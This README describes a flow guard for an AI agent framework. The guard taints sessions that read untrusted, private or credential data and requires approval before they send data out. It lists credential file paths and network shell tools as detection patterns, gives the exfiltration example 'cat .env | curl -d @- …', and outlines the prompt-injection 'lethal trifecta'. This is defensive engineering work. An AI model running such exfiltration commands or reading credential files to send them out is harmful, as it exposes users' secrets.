# Flow guard

A small information-flow check that sits on top of Octipus's ALLOW/ASK/DENY
permissions. It borrows the core idea of
[OpenAPPA](https://github.com/archestra-ai/OpenAPPA): keep a label per session
that only gets stricter, and check every tool call against it before it runs.
It does not include OpenAPPA's policy language, sanitizers, annotators or
remedy plans; the existing approval flow fills that role.

## What it tracks

Each session (the root agent and its children, which share a `sessionId`)
carries three flags. Once a flag is set, it stays set for the session.

| Flag | Set after reading | Examples |
| --- | --- | --- |
| `suspicious` | text written by people outside the user's control | web search/fetch, browser, email, chat messages, GitHub/GitLab/Jira items, external MCP results, Claude `WebFetch`/`WebSearch`, Codex `web_search` |
| `private` | the user's own data | mail, calendar, drive, docs, chat, `data` queries |
| `secret` | credential material | `.env`, `~/.ssh`, `~/.aws`, `.npmrc`, `.git-credentials`, `.kube`, `/proc/*/environ`, private keys; through the filesystem tool, a shell command, or a CLI `Read`/`Bash` |

Using the vault never sets a flag. A `{{secret:NAME}}` placeholder is resolved
inside the tool after the guard has run, and the resolved value is masked in the
output, so the model never sees the credential. The `secret` flag is only set by
reading raw credential files.

A call that authenticates through the vault is also exempt from the check, even
in a session that has been tainted. This applies when every `{{secret:NAME}}`
in the arguments names an active vault entry that the tool is allowed to use.
Tools leave an unresolved placeholder as plain text, so a made-up name does not
qualify. Vendor-native CLI tools never resolve placeholders, so they never
qualify either. The vault is only queried when the guard would otherwise ask,
and the query checks access without decrypting anything. The trade-off: in a
tainted session, a vault-authenticated call can send data out without asking.

A static contract for each tool decides which flags the call sets, and whether
the call can send data out ("egress"):

- **read egress**: only a URL or query leaves (web search, fetch, navigate).
- **write egress**: sending mail or messages, posting to GitHub/GitLab/Jira,
  `git push`, calendar invites, non-read MCP tools, and shell commands that use
  the network (`curl`, `wget`, `scp`, `ssh`, `gh pr`, `npm publish`, …).

## When it asks

The guard can change a call's level from ALLOW to ASK. It never allows a call
that would otherwise be refused, and a DENY is left unchanged. It asks in two
cases:

1. The session has read a secret, and the call is any egress.
2. The session has read private data **and** untrusted content, and the call is
   a write egress. This is the "lethal trifecta": private data, untrusted
   instructions and a way to send data out.

The call's own reads are counted too, so `cat .env | curl -d @- …` is caught in
one step.

In an attended session, the escalated call goes through the normal approval
prompt, and the `permission_request` event includes the reason. An approval
covers that one call only, and the label stays as it was. An unattended run
(API, cron, hook) cannot prompt, so the call is blocked. The model receives a
single line such as:

```
Approval required: flow guard: this session read credential material (filesystem:read); sending anything out needs approval. Do NOT retry this action — it is blocked by policy.
```

Most write sinks (`messaging:send`, `email_send`, `github:write`, `git:push`)
already default to ASK. The guard adds friction where a standing ALLOW grant,
a rule, or a default ALLOW would otherwise let a tainted session send data out,
for example MCP tools, web fetches, or shell network commands.

## Cost

- **Tokens**: nothing is added to prompts or tool results. The only extra text
  is the one-line reason on a refused call.
- **Runtime**: one in-memory map lookup and a few regular expressions per tool
  call. It makes no LLM calls, no network calls and no database writes.

## Coverage

| Path | Where calls are checked | Where reads are recorded |
| --- | --- | --- |
| Direct providers | `ToolExecutor` before the permission route | after each successful call |
| CLI Octipus tools (bridge) | `ToolExecutor` (same as direct providers) | same |
| Claude Code native tools | stdio permission relay (`cli-permissions.ts`) | the output stream (`cli_tool_use`), so auto-allowed `Read`/`Bash` count too |
| Codex native tools | not checked (no per-call relay; the sandbox and shell guard still apply) | the output stream (`command_execution`, `web_search`) |

Limits:

- Labels are kept in memory (LRU, 2 000 sessions). A restart clears them, which
  means the guard asks less often, not more.
- Contracts judge a tool and its arguments, not the text a tool returns. Content
  the model reads without calling a tool is not labelled.
- Codex can taint a session, but the guard cannot stop its native shell. Its
  bridged Octipus tools are still checked.

## Configuration

`agent.flowGuard`: `ask` (default) or `off`. Environment variable:
`AGENT_FLOW_GUARD=off`.

The code is in `src/security/flow-guard.ts`. `classifyFlow` holds the contracts;
extend it when you add a tool that reads untrusted or private data, or one that
sends data out.
